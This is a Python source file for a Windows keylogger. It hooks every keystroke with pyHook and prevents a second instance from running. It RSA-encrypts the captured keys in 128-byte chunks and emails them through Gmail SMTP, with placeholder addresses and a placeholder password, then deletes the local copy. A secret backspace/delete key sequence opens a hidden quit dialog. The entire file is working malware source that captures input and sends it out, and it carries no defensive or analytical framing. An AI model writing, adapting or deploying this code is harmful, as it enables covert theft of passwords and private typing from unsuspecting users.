import pyHook
import pythoncom
import sys
import os

# For email function
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email import encoders
from email.MIMEBase import MIMEBase

import win32event
import win32api
import winerror
import base64

from Tkinter import *  # For GUI

from Crypto.PublicKey import RSA # For encryption
from Crypto import Random

file_log = 'log.txt'  # To output logged keys
data = ''  # To hold logged key
exitStack = []
keyLength = 128  # 1024 bits = 128 bytes

# Disallow multiple instances. source: ajinabraham/Xenotix-Python-Keylogger
mutex = win32event.CreateMutex(None, 1, 'mutex_var_xboz')
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    mutex = None
    print "Multiple Instance not Allowed"
    exit(0)


class Application(Frame):  # Class for implementation of exitGui
    def CreateWidgets(self):
        self.QUIT = Button(self)
        self.QUIT["text"] = "QUIT"
        self.QUIT["fg"] = "red"
        self.QUIT["command"] = self.quit

        self.QUIT.pack({"side": "left"})

    def __init__(self, master=None):
        Frame.__init__(self, master)
        self.pack()
        self.CreateWidgets()


class Secure:
    global keyLength

    def __init__(self):     # initializes the public and private keys by reading files pubKey and privi respectively
                            # Keys have to be generated separately. The decrypt function is provided for debugging
                            # purpose. No decryption is carried out at user-end.
        # Reading public key
        f = open('pubKey', 'rb')
        self.pubKey = f.read()
        f.close()

        # Reading private key
        f = open('privi', 'rb')
        self.privateKey = f.read()
        f.close()

        self.key = []

    def encrypt(self, data):
        self.key = RSA.importKey(self.pubKey)
        return self.key.encrypt(data, 32)

    def decrypt(self, data):
        self.key = RSA.importKey(self.privateKey)
        return self.key.decrypt(data)

    def writeEncryptedDataToFile(self, enc_data, filename='encLogs.txt'):
        f = open(filename, 'w+')
        f.write("".join(enc_data,))
        f.close()
        return 1

    def readLogs(self, filename='log.txt'):  # By default, reads the log file
        f = open(filename, 'rb')
        data = f.read(keyLength)
        f.close()
        return data


def OnKeyBoardEvent(event):
    global data
    global exitStack
    global keyLength
    # logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
    # logging.log(10,chr(event.Ascii))

    if event.Ascii == 8:  # Exit on backspace
        key = '<BACKSPACE>'
    elif event.Ascii == 13:  # Carraige return representation
        key = '<ENTER>'
    elif event.Ascii == 9:  # TAB Representation
        key = '<TAB>'
    else:
        key = chr(event.Ascii)

    data += key

    if event.Ascii == 8:
        exitStack.append(event.Ascii)
    elif event.Ascii == 0:
        exitStack.append(event.Ascii)
    else:
        exitStack = []

    if len(exitStack) == 4:
        if exitStack[0] == 8 and exitStack[1] == 0 and exitStack[2] == 8 and exitStack[3] == 0:  # If last four values
            app.mainloop()                                                                       # entered were <back><del><back><del>
            root.destroy()                                                                       # spawn a quit dialog box
            exit(1)
        else:
            exitStack = []

    if len(data) == keyLength:  # Encrypt data in chunks of bytes equal to the bytes in the key and email them
        # Encrypt file before Emailing
        enc_data = secureCom.encrypt(data)

        # Write encrypted data to file
        secureCom.writeEncryptedDataToFile(enc_data)

        # Read encrypted data from file
        # enc_data = secureCom.readLogs('encLogs.txt')
        # print secureCom.decrypt(enc_data)

        Email()  # Email the encrypted log.txt
        os.remove('encLogs.txt') # Once the file has been emailed, delete it

    return True


def OutputKeys(): # Was used in earlier implementations. Not being used currently.
    global data

    f = open('log.txt', 'a')  # Open log file to write keys
    f.write(data)
    f.close()
    data = ''
    return True


def Email():
    fromAddress = "<email address>"
    toAddress = "<email address>"
    message = MIMEMultipart()
    message['From'] = fromAddress
    message['To'] = toAddress
    message['Subject'] = "python keys"
    body = "TEST BODY"

    message.attach(MIMEText(body, 'plain'))

    #Attachment
    filename = "encLogs.txt"
    attachment = open(filename, "rb")

    finalAttachment = MIMEBase('application', 'octet-stream')
    finalAttachment.set_payload((attachment).read())
    encoders.encode_base64(finalAttachment)
    finalAttachment.add_header('Content-Description', "attachment; filename= %s" %filename)

    message.attach(finalAttachment)
    finalMessage = message.as_string()

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    try:
        s.login(fromAddress, "<email password>")
    except smtplib.SMTPAuthenticationError:
        print "Invalid creds"
    try:
        s.sendmail(fromAddress, toAddress, finalMessage)
        print "Email Sent!"
    except:
        print "Unable to send email"
    s.quit()


secureCom = Secure()
root = Tk()                            # Tk Object
app = Application(root)                # Passing Tk object to our GUI implementation class
hooks_manager=pyHook.HookManager()     # Create a hook
hooks_manager.KeyDown=OnKeyBoardEvent  # Assign keydown event handler
hooks_manager.HookKeyboard()           # assign hook to the keyboard
pythoncom.PumpMessages()             